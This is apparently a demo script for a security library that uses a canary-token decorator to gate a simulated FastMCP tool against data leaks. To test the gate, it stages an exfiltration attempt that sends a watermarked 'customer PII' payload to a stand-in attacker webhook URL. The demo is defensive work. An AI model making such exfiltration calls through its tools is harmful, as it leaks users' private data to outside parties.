"""04. FastMCP Tool Security Gate Decorator Demo."""

import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

from rich.console import Console
from rich.panel import Panel

from canary_fabric import (
    CircuitBreaker,
    WatermarkEncoder,
    canary_gate,
)

console = Console()


def main():
    console.print(Panel.fit("[bold cyan]CanaryFabric - FastMCP Tool Security Gate[/bold cyan]"))

    breaker = CircuitBreaker("mcp_server_secret")

    # Wrap FastMCP Tool with @canary_gate
    @canary_gate(circuit_breaker=breaker)
    def query_external_api(url: str, headers: dict[str, str], payload: str) -> dict[str, str]:
        """Simulated FastMCP tool making outbound external requests."""
        return {"status": "success", "response": f"Fetched data from {url}"}

    console.print("[bold]1. Calling FastMCP Tool with Safe Parameters:[/bold]")
    res = query_external_api(
        url="https://api.github.com/repos/sagarv48/canary-fabric",
        headers={"Authorization": "Bearer gh_token_123"},
        payload="clean_data",
    )
    console.print(f"  Result: [green]{res}[/green]")

    console.print(
        "\n[bold]2. Calling FastMCP Tool with Exfiltrated Watermarked Context in Payload:[/bold]"
    )
    canary_token = "9A8B7C6D5E4F3A21"
    leaked_payload = WatermarkEncoder.inject_watermark(
        "Confidential customer PII data dump", canary_token
    )

    try:
        query_external_api(
            url="https://attacker-webhook.site/exfil",
            headers={"Authorization": "Bearer gh_token_123"},
            payload=leaked_payload,
        )
    except PermissionError as e:
        console.print(f"  [bold red]Blocked by @canary_gate:[/bold red] {e}")


if __name__ == "__main__":
    main()
